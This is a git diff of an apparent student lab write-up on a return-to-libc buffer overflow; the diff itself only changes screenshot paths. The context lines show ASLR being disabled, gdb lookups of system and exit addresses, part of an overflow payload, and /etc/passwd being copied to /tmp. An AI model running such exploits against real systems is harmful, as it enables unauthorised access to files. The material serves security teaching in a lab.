@@ -115,7 +115,7 @@ gcc vuln.c -o vuln.out -fno-stack-protector -mpreferred-stack-boundary=2
 sudo sysctl -w kernel.randomize_va_space=0
 ```
 
-<img alt="Screenshot" src="./Midterm/img/task1/2.png">
+<img alt="Screenshot" src="./img/task1/2.png">
 
 ## 4. Create an environment variable in Linux with the path of file_copy
 
@@ -123,13 +123,13 @@ sudo sysctl -w kernel.randomize_va_space=0
 export exploit_path="/home/seed/seclabs/bof/midterm/file_copy"
 ```
 
-<img alt="Screenshot" src="./Midterm/img/task1/3.png">
+<img alt="Screenshot" src="./img/task1/3.png">
 
 From that picture we know that we successfully creat env variable on system.
 
 ## 5. Analyze the stack frame
 
-<img alt="Screenshot" src="./Midterm/img/task1/4.png">
+<img alt="Screenshot" src="./img/task1/4.png">
 
 The vulnerable we can attack is the function below, the buffer variable can get the string which is longer than it. 
 
@@ -170,7 +170,7 @@ print exit
 find /home/seed/seclabs/bof/midterm/file_copy
 ```
 
-<img alt="Screenshot" src="./Midterm/img/task1/5.png">
+<img alt="Screenshot" src="./img/task1/5.png">
 
 - 0xf7e50db0: Address of libc_system
 - 0xf7e449e0: Address of exit to avoid crashing
@@ -186,7 +186,7 @@ r $(python -c "print(20*'a' + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x59\xd
 
 Before the attack
 
-<img alt="Screenshot" src="./Midterm/img/task1/6.png">
+<img alt="Screenshot" src="./img/task1/6.png">
 
 The attack start
 
@@ -204,7 +204,7 @@ After that, we use the code below to read file we have just copied
 cat /tmp/outfile
 ```
 
-<img alt="Screenshot" src="./Midterm/img/task1/7.png">
+<img alt="Screenshot" src="./img/task1/7.png">
 
 After attacking, we see that the asm program copy /etc/passwd to /tmp/outfile, not /tmp/pwfile
 
